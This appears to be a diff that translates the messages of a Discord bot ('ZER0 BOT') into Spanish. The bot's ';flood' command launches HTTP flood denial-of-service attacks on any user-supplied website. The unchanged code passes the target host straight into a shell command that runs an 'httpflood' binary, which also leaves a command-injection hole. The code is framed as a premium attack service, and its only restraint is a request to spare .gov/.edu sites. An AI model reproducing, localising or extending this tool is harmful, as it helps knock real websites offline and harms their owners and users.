@@ -15,9 +15,9 @@ if (message.channel.id != room) {
 if(!args[0]) {
 	const embed1 = new Discord.MessageEmbed()
 	.setColor('RANDOM')
-	.setTitle('WARRING')
-	.setDescription("`Example: ;flood https://example.com/`")
-	.setFooter("Please do not attack websites with domain .gov/.edu")
+	.setTitle('⚠️ ADVERTENCIA')
+	.setDescription("`Formato: ;flood https://example.com/`")
+	.setFooter("Por favor no ataque sitios web con dominio .gov/.edu")
 	message.channel.send(embed1);
 	return;
 	}
@@ -26,14 +26,14 @@ var exec = require('child_process').exec
 exec(`./httpflood ${host} ${thread} post ${time} nil`, (error, stdout, stderr) => {
 });
 setTimeout(function(){ 
-    console.log('Stop Attacking ID Discord:' +  message.guild.id)
+    console.log('Ataque detenido ID Discord:' +  message.guild.id)
 
 
 const embed = new Discord.MessageEmbed()
 	.setColor('RANDOM')
 	.setTitle('🔥 **ZER0 BOT** 🔥')
 	.setTimestamp()
-	.setDescription("**► The attack has stopped 💥**")
+	.setDescription("**► ¡Ataque finalizado 💥**")
 	.setFooter('© Developer: zxcr9999#1770', client.user.avatarURL)
 	.setTimestamp()
 	.setThumbnail("")
@@ -41,14 +41,14 @@ const embed = new Discord.MessageEmbed()
  }, 120000); //time in milliseconds
 var gifler = ["https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif", "https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif", "https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif" , "https://media.giphy.com/media/3o7aDdSjGlUbmwFCQo/giphy.gif"];
     var randomgif = gifler[Math.floor((Math.random() * gifler.length))];
-console.log('Start Attacking ID Discord:' +  message.guild.id)
+console.log('Iniciando ataque ID Discord:' +  message.guild.id)
 
 
 const embed = new Discord.MessageEmbed()
 	.setColor('RANDOM')
 	.setTitle('🔥 **ZER0 BOT** 🔥')
 	.setTimestamp()
-	.setDescription("**User**: `PREMIUM ☭` \n **Host**: `" + host + "` \n **Method**: `Flood 💥` \n **Time**: `60 seconds 🕒` \n **If we detect you attack the .gov/.edu website, we will ban you from the server**")
+	.setDescription("**Usuario**: `PREMIUM ☭` \n **Servidor**: `" + host + "` \n **Método**: `Flood 💥` \n **Tiempo**: `60 segundos 🕒` \n **Si detectamos que atacas sitios .gov/.edu, serás baneado del servidor**")
 	.setFooter('© Developer: zxcr9999#1770', client.user.avatarURL)
 	.setTimestamp()
 	.setImage(randomgif)
